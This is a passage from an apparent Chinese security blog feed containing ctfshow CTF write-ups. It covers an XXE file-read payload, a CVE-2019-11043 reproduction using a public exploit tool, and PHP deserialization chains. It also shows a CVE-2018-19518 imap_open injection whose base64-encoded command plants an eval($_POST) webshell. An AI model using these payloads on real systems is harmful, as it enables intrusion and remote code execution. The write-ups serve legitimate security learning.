class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow XXE</title>
      <link href="/2022/01/10/ctfshow%20XXE/"/>
      <url>/2022/01/10/ctfshow%20XXE/</url>
      
        <content type="html"><![CDATA[<p>XXE简介：<br>XXE就是在可以解析XML的地方（比如一个输入框等处）只要可以解析XML语言的代码就可以。在这种地方提交XML的恶意代码来执行。他一般可以做到，内网文件读取，端口扫描，内网程序攻击，任意命令执行等。<br>这边其实XXE是比较少见的，这个漏洞主要也是因为没有对用户输入（用户提交的数据，比如你在输入框输入这个XML恶意代码）并没有合理检测与过滤，将用户提交的数据当XML来执行，造成XXE（XML外部实体注入），最简单的利用方法其实就是用hackbar V2里的XXE选项，他自带了XXE的payload生成功能。直接复制然后放到输入框（可以解析XML代码的地方）就可以了。</p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>LoadXML是MS提供的XMLDom接口中的一个函数，用于将字符串载入一个XML document,该函数的使用存在很多注意事项<br>simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象</p></blockquote><p>paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;cyx&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/cyx&gt;</span><br></pre></td></tr></table></figure><h2 id="web374-378"><a href="#web374-378" class="headerlink" title="web374~378"></a>web374~378</h2><p>由于这些题目需要服务器则看大佬wp<br><a href="https://blog.csdn.net/njh18790816639/article/details/117295145?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164180737616781685331283%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164180737616781685331283&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-117295145.pc_search_insert_es_download&utm_term=ctfshowXXE&spm=1018.2226.3001.4187">大佬wp</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-11043复现和学习</title>
      <link href="/2022/01/07/CVE-2019-11043%20PHP-FPM%20%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/07/CVE-2019-11043%20PHP-FPM%20%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2019-11043复现和学习"><a href="#CVE-2019-11043复现和学习" class="headerlink" title="CVE-2019-11043复现和学习"></a>CVE-2019-11043复现和学习</h2><p>漏洞描述<br>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。<br>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。<br>该漏洞需要在nginx.conf中进行特定配置才能触发。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"> ...</span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>攻击者可以使用换行符（％0a）来破坏fastcgi_split_path_info指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。<br>漏洞范围<br>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：<br>PHP 7.0 版本<br>PHP 7.1 版本<br>PHP 7.2 版本<br>PHP 7.3 版本</p><p>漏洞复现<br>这里用 CTFShow web311的环境来作为靶机复现<br>首先 exp 需要安装 GO 环境，有点麻烦可以参考一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install golang</span><br><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/neex/phuip-fpizdam.git</span></span><br><span class="line">cd phuip-fpizdam</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">到这步可能会报错，一直不能成功</span><br><span class="line">是因为需要换代理，因为我就在这死磕很久</span><br><span class="line">可以执行 go env 看看 proxy 是哪个</span><br><span class="line">报错原因：默认使用的是proxy.golang.org，在国内无法访问</span><br><span class="line">报错解决：执行命令：go env -w GOPROXY=https:<span class="comment">//goproxy.cn（换一个国内能够访问的代理地址</span></span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phuip-fpizdam URL/index.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ba582ff367a147ceb4390cb4d1258514.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="成功截图"><br>之后在/index?a=后加所需命令</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一道反序列化session题</title>
      <link href="/2022/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96session%E9%A2%98/"/>
      <url>/2022/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96session%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">这是foo1的析构函数</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_string(file_get_contents(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral">wp地址</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数组溢出的一道题</title>
      <link href="/2022/01/07/%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/"/>
      <url>/2022/01/07/%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><strong>题目</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$array</span>[++<span class="variable">$c</span>]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$array</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>解析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这个语句正常赋值时，他一定为1，若想跳过语句则必须使他的赋值出问题。<br>即 使数组溢出</p><blockquote><p>作为PHP最重要的数据类型HashTable其key值是有一定的范围的，如果设置的key值过大就会出现溢出的问题，临界点是9223372036854775807这个数字。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-19518</title>
      <link href="/2022/01/07/ctfshow%20CVE-2018-19518%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/07/ctfshow%20CVE-2018-19518%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>本次测试靶场在ctfshow</strong><br><a href="https://blog.csdn.net/qq_46501419/article/details/115050909?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164130335216780274183925%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164130335216780274183925&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-115050909.pc_search_insert_es_download_v2&utm_term=CVE-2018-19518&spm=1018.2226.3001.4187">CVE-2018-19518</a><br><strong>漏洞内容简介</strong></p><blockquote><p>php imap扩展用户在php中执行邮件收发操作，其imap_open函数会调用rsh来连接远程shell，而debianh/Ubuntu中默认使用ssh来代替rsh功能，也就是说debian系列系统中，执行rsh命令实际执行的是ssh命令<br>debian系列系统有Ubuntu、kali、MX linux、AntiX、PureOS等<br>ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者可以通过注入这个参数，最终将导致命令执行漏洞<br>ProxyCommand用来指定连接到服务器的命令. 其可以是任何的命令,只要能从其标准输入读入数据,然后写出到标准输出即可. 这条命令需要连接到sshd服务器上</p></blockquote><p><strong>实战操作</strong>：<br>bp抓包后进行修改<br><img src="https://img-blog.csdnimg.cn/145b48a348754005a71ce34c1afb46db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>%09后面与|前面为要执行命令的base64</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sL2UucGhw|base64%<span class="number">09</span>-d|sh&#125;a&amp;username=<span class="number">222</span>&amp;password=<span class="number">333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我的是将一句话写入e.php中<br>蚁剑连接得到shell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web入门 反序列化</title>
      <link href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><h2 id="魔术变量"><a href="#魔术变量" class="headerlink" title="魔术变量"></a>魔术变量</h2><p>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__sleep() <span class="comment">//在对象被序列化之前运行</span></span><br><span class="line">__wakeup() <span class="comment">//将在反序列化之后立即调用（当反序列化时变量个数与实际不符是会绕过）</span></span><br><span class="line">__construct() <span class="comment">//在类实例化时，会触发进行初始化</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__toString()： <span class="comment">//当一个对象被当作字符串使用时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//获得一个类的成员变量时调用,用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>将isvip变为true,并从cookie中传入，记得url编码！！</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>：<br>   保证输入的username和序列化的一样并且和原来的password不一样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;a&#x27;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line">playload:</span><br><span class="line">?username=xxxxxx&amp;password=a</span><br></pre></td></tr></table></figure><p>web257</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从中可以看出需要利用backDoor这个类；<br>因此进行以下的序列化构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span 